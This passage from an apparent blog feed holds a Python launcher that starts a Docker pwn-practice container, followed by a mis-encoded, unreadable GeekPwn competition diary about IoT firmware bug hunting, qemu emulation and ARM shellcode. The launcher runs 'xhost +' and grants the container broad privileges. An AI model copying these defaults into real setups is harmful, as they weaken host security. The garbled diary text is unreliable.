class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess <span class="keyword">as</span> sp</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> distutils.dir_util <span class="keyword">import</span> mkpath</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXIST_FLAG = <span class="string">&#x27;/tmp/ancypwn.id&#x27;</span></span><br><span class="line">SUPPORTED_UBUNTU_VERSION = [</span><br><span class="line"><span class="comment">#    &#x27;14.04&#x27;, Still many issues to be solved (version problems mostly)</span></span><br><span class="line">    <span class="string">&#x27;16.04&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;18.10&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;18.04&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">client = docker.from_env()</span><br><span class="line">container = client.containers</span><br><span class="line">image = client.images</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InstallationError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnsupportedUbuntuVersion</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AlreadyRuningException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotRunningException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorWrite</span>(<span class="params">object</span>):</span></span><br><span class="line">    COLOR_SET = &#123;</span><br><span class="line">            <span class="string">&#x27;END&#x27;</span>: <span class="string">&#x27;\033[0m&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;yellow&#x27;</span>: <span class="string">&#x27;\033[38;5;226m&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;red&#x27;</span>: <span class="string">&#x27;\033[31m&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;blue&#x27;</span>: <span class="string">&#x27;\033[34m&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;magenta&#x27;</span>: <span class="string">&#x27;\033[35m&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;cyan&#x27;</span>: <span class="string">&#x27;\033[36m&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">color_write</span>(<span class="params">content, color</span>):</span></span><br><span class="line">        print(ColorWrite.COLOR_SET[color] + content + ColorWrite.COLOR_SET[<span class="string">&#x27;END&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">colorwrite_init</span>():</span></span><br><span class="line">    <span class="keyword">for</span> color <span class="keyword">in</span> ColorWrite.COLOR_SET:</span><br><span class="line">        <span class="comment"># Use default value for lambda to avoid lazy capture of closure</span></span><br><span class="line">        setattr(ColorWrite, color, staticmethod(<span class="keyword">lambda</span> x, color=color: ColorWrite.color_write(x, color)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Static initialize ColorWrite</span></span><br><span class="line">colorwrite_init()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_args</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parses commandline arguments</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        args -- argparse namespace, contains the parsed arguments</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;Anciety&#x27;s pwn environment&quot;</span></span><br><span class="line">    )</span><br><span class="line">    subparsers = parser.add_subparsers(</span><br><span class="line">        help=<span class="string">&#x27;Actions you can take&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    run_parser = subparsers.add_parser(</span><br><span class="line">        <span class="string">&#x27;run&#x27;</span>,</span><br><span class="line">        help=<span class="string">&#x27;run a pwn thread&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    run_parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;directory&#x27;</span>,</span><br><span class="line">        type=str,</span><br><span class="line">        help=<span class="string">&#x27;The directory which contains your pwn challenge&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    run_parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--ubuntu&#x27;</span>,</span><br><span class="line">        type=str,</span><br><span class="line">        help=<span class="string">&#x27;The version of ubuntu to open&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    run_parser.set_defaults(func=run_pwn)</span><br><span class="line"></span><br><span class="line">    run_parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--priv&#x27;</span>,</span><br><span class="line">        action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">        help=<span class="string">&#x27;privileged boot, so you can use something like kvm&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    attach_parser = subparsers.add_parser(</span><br><span class="line">        <span class="string">&#x27;attach&#x27;</span>,</span><br><span class="line">        help=<span class="string">&#x27;attach to running thread&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">    attach_parser.set_defaults(func=attach_pwn)</span><br><span class="line"></span><br><span class="line">    end_parser = subparsers.add_parser(</span><br><span class="line">        <span class="string">&#x27;end&#x27;</span>,</span><br><span class="line">        help=<span class="string">&#x27;end a running thread&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    end_parser.set_defaults(func=end_pwn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> vars(args) != &#123;&#125;:</span><br><span class="line">        args.func(args)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.print_usage()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_terminal_size</span>():</span></span><br><span class="line">    p = sp.Popen(<span class="string">&#x27;tput cols&#x27;</span>, shell=<span class="literal">True</span>, stdout=sp.PIPE)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_print_warning</span>():</span></span><br><span class="line">        print(<span class="string">&#x27;Warning: Unable to get terminal size, you need to specify terminal size &#x27;</span> +</span><br><span class="line">              <span class="string">&#x27;manually or your command line may behave strangely&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> p.returncode != <span class="number">0</span>:</span><br><span class="line">        _print_warning()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    cols = int(p.stdout)</span><br><span class="line">    p = sp.Popen(<span class="string">&#x27;tput lines&#x27;</span>, shell=<span class="literal">True</span>, stdout=sp.PIPE)</span><br><span class="line">    <span class="keyword">if</span> p.returncode != <span class="number">0</span>:</span><br><span class="line">        _print_warning()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    rows = int(p.stdout)</span><br><span class="line">    <span class="keyword">return</span> cols, rows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_read_container_name</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(EXIST_FLAG):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Pwn thread is not running&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    container_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> open(EXIST_FLAG, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> flag:</span><br><span class="line">        container_name = flag.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> container_name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        os.remove(EXIST_FLAG)</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Meta info corrupted, or unable to read saved info. &#x27;</span> + \</span><br><span class="line">                <span class="string">&#x27;Cleaning corrupted meta-info, please shutdown container manually&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> container_name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_attach_interactive</span>(<span class="params">name</span>):</span></span><br><span class="line">    cols, rows = _get_terminal_size()</span><br><span class="line">    <span class="keyword">if</span> rows <span class="keyword">and</span> cols:</span><br><span class="line">        cmd = <span class="string">&quot;docker exec -it &#123;&#125; bash -c \&quot;&#123;&#125;\&quot;&quot;</span>.format(</span><br><span class="line">            name,</span><br><span class="line">            <span class="string">&#x27;stty cols &#123;&#125; &amp;&amp; stty rows &#123;&#125; &amp;&amp; bash&#x27;</span>.format(</span><br><span class="line">                cols,</span><br><span class="line">                rows,</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd = <span class="string">&quot;docker exec -it &#123;&#125; &#x27;/bin/bash&#x27;&quot;</span>.format(</span><br><span class="line">            name,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    ColorWrite.yellow(</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ______                   _____    __   ___       </span></span><br><span class="line"><span class="string">    |   __ \.--.--.--..-----.|     |_ |__|.&#x27;  _|.-----.</span></span><br><span class="line"><span class="string">    |    __/|  |  |  ||     ||       ||  ||   _||  -__|</span></span><br><span class="line"><span class="string">    |___|   |________||__|__||_______||__||__|  |_____|</span></span><br><span class="line"><span class="string">                             </span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    os.system(cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_pwn</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Runs a pwn thread</span></span><br><span class="line"><span class="string">    Just sets needed docker arguments and run it</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.ubuntu:</span><br><span class="line">        ubuntu = <span class="string">&#x27;16.04&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># check for unsupported ubuntu version</span></span><br><span class="line">        <span class="keyword">if</span> args.ubuntu <span class="keyword">not</span> <span class="keyword">in</span> SUPPORTED_UBUNTU_VERSION:</span><br><span class="line">            <span class="keyword">raise</span> UnsupportedUbuntuVersion(<span class="string">&#x27;version %s not supported!&#x27;</span> % args.ubuntu )</span><br><span class="line">        ubuntu = args.ubuntu</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.directory.startswith(<span class="string">&#x27;~&#x27;</span>) <span class="keyword">and</span> \</span><br><span class="line">            <span class="keyword">not</span> args.directory.startswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">                <span class="comment"># relative path</span></span><br><span class="line">        args.directory = os.path.abspath(args.directory)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(args.directory):</span><br><span class="line">        <span class="keyword">raise</span> IOError(<span class="string">&#x27;No such directory&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(EXIST_FLAG):</span><br><span class="line">        <span class="keyword">raise</span> AlreadyRuningException(<span class="string">&#x27;Another pwn thread is already running&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    privileged = <span class="literal">True</span> <span class="keyword">if</span> args.priv <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># First we need a running thread in the background, to hold existence</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">&#x27;xhost +&#x27;</span>)</span><br><span class="line">        idx = os.popen(<span class="string">&#x27;ifconfig en0&#x27;</span>).read().find(<span class="string">&#x27;inet &#x27;</span>)</span><br><span class="line">        ip = os.popen(<span class="string">&#x27;ifconfig en0&#x27;</span>).read()[idx+<span class="number">5</span>:idx+<span class="number">19</span>]</span><br><span class="line">        running_container = container.run(</span><br><span class="line">            <span class="string">&#x27;swpwn:&#123;&#125;&#x27;</span>.format(ubuntu),</span><br><span class="line">            <span class="string">&#x27;/bin/bash&#x27;</span>,</span><br><span class="line">            cap_add=[<span class="string">&#x27;SYS_ADMIN&#x27;</span>, <span class="string">&#x27;SYS_PTRACE&#x27;</span>],</span><br><span class="line">            detach=<span class="literal">True</span>,</span><br><span class="line">            tty=<span class="literal">True</span>,</span><br><span class="line">            volumes=&#123;</span><br><span class="line">                os.path.expanduser(args.directory) : &#123;</span><br><span class="line">                    <span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/pwn&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                os.path.expanduser(<span class="string">&#x27;~/.Xauthority&#x27;</span>) : &#123;</span><br><span class="line">                    <span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/root/.Xauthority&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                os.path.expanduser(<span class="string">&#x27;/tmp/.X11-unix&#x27;</span>) : &#123;</span><br><span class="line">                    <span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/.X11-unix&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            privileged=privileged,</span><br><span class="line">            network_mode=<span class="string">&#x27;host&#x27;</span>,</span><br><span class="line">            environment=&#123;</span><br><span class="line">                <span class="string">&#x27;DISPLAY&#x27;</span>: ip+<span class="string">&#x27;:0&#x27;</span></span><br><span class="line">                <span class="comment"># &#x27;DISPLAY&#x27;: os.environ[&#x27;DISPLAY&#x27;]</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&#x27;This maybe caused by not completely installed ancypwn.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;Have you read https://github.com/Escapingbug/ancypwn?&#x27;</span>)</span><br><span class="line">        print()</span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set flag, save the container id</span></span><br><span class="line">    <span class="keyword">with</span> open(EXIST_FLAG, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> flag:</span><br><span class="line">        flag.write(running_container.name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Then attach to it, needs to do it in shell since we need</span></span><br><span class="line">    <span class="comment"># shell to do the input and output part(interactive part)</span></span><br><span class="line">    _attach_interactive(running_container.name)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach_pwn</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Attaches to a pwn thread</span></span><br><span class="line"><span class="string">    Just sets needed docker arguments and run it as well</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    container_name = _read_container_name()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># FIXME Is it better that we just exec it with given name?</span></span><br><span class="line">    conts = container.list(filters=&#123;<span class="string">&#x27;name&#x27;</span>:container_name&#125;)</span><br><span class="line">    <span class="keyword">if</span> len(conts) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> InstallationError(<span class="string">&#x27;Installation seems to be run. There are more than one image called ancypwn&#x27;</span>)</span><br><span class="line">    _attach_interactive(conts[<span class="number">0</span>].name)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">end_pwn</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Ends a running thread</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    container_name = _read_container_name()</span><br><span class="line">    conts = container.list(filters=&#123;<span class="string">&#x27;name&#x27;</span>:container_name&#125;)</span><br><span class="line">    <span class="keyword">if</span> len(conts) &lt; <span class="number">1</span>:</span><br><span class="line">        os.remove(EXIST_FLAG)</span><br><span class="line">        <span class="keyword">raise</span> NotRunningException(<span class="string">&#x27;No pwn thread running, corrupted meta info file, deleted&#x27;</span>)</span><br><span class="line">    conts[<span class="number">0</span>].stop()</span><br><span class="line">    conts[<span class="number">0</span>].remove()</span><br><span class="line">    os.remove(EXIST_FLAG)</span><br><span class="line">    <span class="comment"># os.system(&#x27;docker rm &#x27;+conts[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeekPwn å‚èµ›è®°</title>
      <link href="GeekPwn%E5%8F%82%E8%B5%9B%E8%AE%B0.html"/>
      <url>GeekPwn%E5%8F%82%E8%B5%9B%E8%AE%B0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="GeekPwn-å‚èµ›è®°"><a href="#GeekPwn-å‚èµ›è®°" class="headerlink" title="GeekPwn å‚èµ›è®°"></a>GeekPwn å‚èµ›è®°</h2><h3 id="0x01-é¢˜è®°"><a href="#0x01-é¢˜è®°" class="headerlink" title="0x01 é¢˜è®°"></a>0x01 é¢˜è®°</h3><p>è¿Ÿåˆ°çš„å‚èµ›è®°â€¦</p><p>äº‹æƒ…ï¼Œè¦ä»æˆ‘åœ¨360å®ä¹ çš„æ—¶å€™è¯´èµ·ï¼Œå…¶å®é‚£ä¸ªæ—¶å€™ r3kapig å°±æƒ³æ³•è¦å‚åŠ  GeekPwnï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬å°±åˆ†äº†å‡ ä¸ªç»„ï¼š</p><p>xxx å’Œxxx æƒ³ææ¸¸æˆå¼•æ“</p><p>xxx å’Œ xxx æƒ³æ office ã€wps é˜¿windows å†…æ ¸é˜¿ è¯¸å¦‚æ­¤ç±»â€¦</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115151437.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115151437.png"></a></p><p>æ²¡åŠæ³•ï¼Œæˆ‘è¿™ç§åƒåœ¾ï¼Œåªèƒ½é€‰æ‹©å»çœ‹ IoT è®¾å¤‡äº†â€¦</p><h3 id="0x02-ç»å†"><a href="#0x02-ç»å†" class="headerlink" title="0x02 ç»å†"></a>0x02 ç»å†</h3><h4 id="æ‹¿ä¸åˆ°å›ºä»¶-è¿˜é…åšé»‘å®¢ä¹ˆï¼Ÿ"><a href="#æ‹¿ä¸åˆ°å›ºä»¶-è¿˜é…åšé»‘å®¢ä¹ˆï¼Ÿ" class="headerlink" title="æ‹¿ä¸åˆ°å›ºä»¶ è¿˜é…åšé»‘å®¢ä¹ˆï¼Ÿ"></a>æ‹¿ä¸åˆ°å›ºä»¶ è¿˜é…åšé»‘å®¢ä¹ˆï¼Ÿ</h4><p> ä¸€å¼€å§‹ï¼Œæˆ‘ä»¬å’Œ w1ther è¦æå°ç±³éŸ³ç®±ï¼Œç„¶åé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¿©éƒ½æ²¡è®¾å¤‡æ‹¿å›ºä»¶ã€‚è¿™å°±çŠ¯æ„äº†ï¼Œæˆ‘è¯´è¦ä¸ä¼¯åšï¼Œå»ä½ ä»¬å­¦æ ¡çš„å®éªŒå®¤çœ‹çœ‹æœ‰æ²¡æœ‰åŠæ³•æå§ï¼Ÿ</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115135205.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115135205.png"></a></p><p>æœ€åä¼¯åšï¼Œå‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªä»–ä»¬å®éªŒå®¤æ²¡åŠæ³•æ </p><h4 id="è½¬æœº"><a href="#è½¬æœº" class="headerlink" title="è½¬æœº"></a>è½¬æœº</h4><p>ç„¶ååæ¥å¾—çŸ¥ï¼Œæ­¤æ—¶æˆ‘ä»¬ r3kapig çš„é‡‘ä¸»çˆ¸çˆ¸ äº¬ä¸œçš„æŸå®éªŒè€æ¿ kjå¤§ä½¬ä¹Ÿæƒ³æ‰“ GeekPwn ï¼Œäºæ˜¯æˆ‘ä»¬å°±æœ‰äº†æŠ±å¤§è…¿çš„æƒ³æ³•â€¦</p><p>äºæ˜¯åé¢çš„æ—¥å­ï¼Œå°±å˜æˆäº†â€¦kj -&gt; å›ºä»¶æ‰¹é‡å‘å”®å•†ï¼</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115135829.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115135829.png"></a></p><h4 id="IDA-å¯åŠ¨ï¼-IDA-å…³é—­ï¼"><a href="#IDA-å¯åŠ¨ï¼-IDA-å…³é—­ï¼" class="headerlink" title="IDA å¯åŠ¨ï¼ IDA å…³é—­ï¼"></a>IDA å¯åŠ¨ï¼ IDA å…³é—­ï¼</h4><p>Emmm æ‹¿åˆ°çš„å›ºä»¶éƒ½æ˜¯ ARM çš„è¿™ä¸ªæ¯” æŸMIPS å¥½çœ‹å¤šäº†â€¦</p><p><a href="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115140353.png" class="gallery-item"><img src="https://raw.githubusercontent.com/WinMin/gitpic/master/20181115140353.png"></a></p><p>è¿™é‡Œè†œæ‹œä¸‹ Atum ï¼Œemmm å¦‚æœçº¯ç²¹ä¸ºäº†æŒ–æ´ Atumæ–¹æ³•æ˜¯çœŸå®ç”¨ï¼Œä»–æŠŠå„ä¸ª sscanf é˜¿ systemé˜¿ å•¥å‡½æ•°çš„å¼•ç”¨çœ‹äº†ä¸€éâ€¦åˆ·å°±æœ‰æ´äº†â€¦.</p><h4 id="DEBUG-â€¦"><a href="#DEBUG-â€¦" class="headerlink" title="DEBUG â€¦"></a>DEBUG â€¦</h4><p>æ‰¾åˆ°äº†ğŸ•³ â€¦ æ¥ç€å°±è¦ debugäº†ï¼ï¼ï¼</p><p>æˆ‘ä»¬é€šå¸¸ä¸¤ç§æ–¹æ³•</p><ol><li>è®¾å¤‡æœ‰è°ƒè¯•æ¥å£ æˆ–è€…æœ‰åé¢ ï¼Œä¸Šä¼  gdbserver</li><li>qemuæ¨¡æ‹Ÿ</li></ol><p>ç”±äºæˆ‘æ²¡æœ‰è®¾å¤‡ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œç”¨çš„ qemu æ¨¡æ‹Ÿï¼Œä½†æ˜¯æˆ‘ä»¬ CTF ä¸Šçš„ qemu æ¨¡æ‹Ÿï¼Œé€šå¸¸æŒ‡è·‘ä¸€ä¸ª bin ï¼Œç„¶åæˆ‘ä»¬ä¸“é—¨å‘kj å­¦ä¹ äº†å¦‚ä½•æ­å»ºä¸€ä¸ª qemu æ¨¡æ‹Ÿ arm ç³»ç»Ÿï¼Œè¿™ä¸ªå°±ç›¸å½“äºä½ è·‘äº†ä¸€ä¸ª æ¿å­äº†..</p><p>æ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥çœ‹ è¿™ç¯‡ <a href="https://bestwing.me/%E6%9E%84%E5%BB%BA%E5%B5%8C%E5%85%A5%E5%BC%8Fqemu.html">æ„å»ºqemuåµŒå…¥å¼</a>ï¼š</p><p>å½“ç„¶ MIPS ä¹Ÿæ˜¯ä¸€æ ·çš„æ–¹æ³•ï¼Œæ¢ä¸ª kernel å’Œ initrd</p><p>å½“ç„¶ï¼Œè·‘åœ¨ æ¨¡æ‹Ÿå™¨çš„åŒæ—¶ï¼Œä½ å¯èƒ½éœ€è¦ patch ä¸€äº›å¯åŠ¨é¡¹ï¼</p><h4 id="CODE-EXPLOIT"><a href="#CODE-EXPLOIT" class="headerlink" title="CODE EXPLOIT"></a>CODE EXPLOIT</h4><p>è¿™é‡Œä¼šæ¶‰åŠåˆ°ä¸€ç‚¹ arm çš„shellcode çŸ¥è¯†ï¼ï¼ï¼</p><p>ä¸€å¼€å§‹ï¼Œæˆ‘ä»¬ä½¿ç”¨ Pwntools çš„ <a href="http://docs.pwntools.com/en/stable/asm.html">Assembly</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115141358.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115141358.png"></a></p><p>ç„¶åå‡ºäº†ä¸€ä¸¢ä¸¢ bugï¼Œåé¢å‘ç°æ˜¯ä¾èµ–ä¸è¶³.. ç„¶æŠŠ <code>binutils-arm-linux-gnueabi binutils-dev binutils-multiarch</code> è¿™ä¸‰ä¸ªä¸€è£…å°±å¥½äº†â€¦</p><p>åé¢å‘ç° Pwntools çš„ä¸è¶³ä»¥ æˆ–è€…æœ‰é—®é¢˜ï¼Œäºæ˜¯æˆ‘ä»¬å¼€å§‹ æ‰‹å†™ shellcode</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115141802.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img20181115141802.png"></a></p><p>æœç„¶è¿˜æ˜¯ google 